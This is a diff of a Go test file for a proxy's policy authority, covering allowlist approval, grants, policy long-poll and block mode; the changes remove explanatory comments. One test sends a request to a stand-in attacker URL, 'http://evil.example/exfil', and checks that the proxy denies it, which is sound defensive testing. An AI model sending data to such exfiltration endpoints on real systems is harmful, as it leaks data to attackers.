@@ -79,8 +79,6 @@ func TestPolicyAuthority(t *testing.T) {
 		t.Errorf("approved hosts = %v", hosts)
 	}
 
-	// Re-registration picks up approval and yields a per-instance grant
-	// (renewal by re-registration, §3.4; D-2026-08-24-1).
 	session2, binding2 := registerInstance(t, ts, "voxgig-solardemo", up.ts.URL)
 	if binding2["state"] != StateApproved {
 		t.Fatalf("post-approval state = %v, want approved", binding2["state"])
@@ -126,9 +124,6 @@ func TestPolicyAuthority(t *testing.T) {
 		t.Errorf("code = %q, want %q", got, CodeHostAllow)
 	}
 
-	// Widening ignored: a descriptor claiming an off-allowlist base
-	// cannot widen approved policy - egress to it is still denied, and
-	// the approved allowlist stays in force unnarrowed.
 	session3, _ := registerInstance(t, ts, "voxgig-solardemo", "http://evil.example")
 	resp = forward(t, ts, session3, nil, envelope(t, "http://evil.example/exfil", "GET", nil, ""))
 	if resp.StatusCode != http.StatusForbidden {
@@ -142,7 +137,6 @@ func TestPolicyAuthority(t *testing.T) {
 		t.Fatalf("allowlisted forward for widening session = %d, want 200", resp.StatusCode)
 	}
 
-	// Status reflects the new stores.
 	st := decode(t, call(t, ts, http.MethodGet, "/v1/status", "", nil, ""))
 	pol := st["policy"].(map[string]any)
 	if covered := pol["covered"].([]any); len(covered) != 1 || covered[0] != "voxgig-solardemo" {
@@ -247,8 +241,6 @@ func TestApprovalPersistence(t *testing.T) {
 	}
 }
 
-// --- §5.3 / D-2026-08-24-1: grants -------------------------------------
-
 func TestGrantLifecycle(t *testing.T) {
 	up := newUpstream(t)
 	clk := newFakeClock()
@@ -346,8 +338,6 @@ func TestGrantLifecycle(t *testing.T) {
 	})
 }
 
-// --- §8.2: policy long-poll --------------------------------------------
-
 func TestPolicyLongPoll(t *testing.T) {
 	up := newUpstream(t)
 	cfgPath := stationJSONFor(t, `"127.0.0.1"`, "proxy", "meta")
@@ -357,7 +347,6 @@ func TestPolicyLongPoll(t *testing.T) {
 	})
 	registerInstance(t, ts, "voxgig-solardemo", up.ts.URL)
 
-	// Immediate view.
 	view := decode(t, call(t, ts, http.MethodGet, "/v1/policy/voxgig-solardemo", "", nil, ""))
 	if view["state"] != StatePending || view["version"] != float64(1) || view["covered"] != true {
 		t.Fatalf("initial view = %v", view)
@@ -401,7 +390,6 @@ func TestPolicyLongPoll(t *testing.T) {
 		t.Fatal("long-poll never woke on approve")
 	}
 
-	// Grant revocation is a policy update too.
 	call(t, ts, http.MethodDelete, "/v1/grants/voxgig-solardemo", "", nil, "")
 	view = decode(t, call(t, ts, http.MethodGet, "/v1/policy/voxgig-solardemo", "", nil, ""))
 	if view["version"] != float64(3) {
@@ -467,8 +455,6 @@ func TestGrantSessionBinding(t *testing.T) {
 		t.Fatalf("own-session forward = %d, want 200", resp.StatusCode)
 	}
 }
-
-// --- §16: `policy.mode: block`, enforced proxy-side --------------------
 
 // TestPolicyModeBlock: `block` is the per-plugin kill switch, and the
 // proxy loads the authoritative profile - so the proxy is the seam that
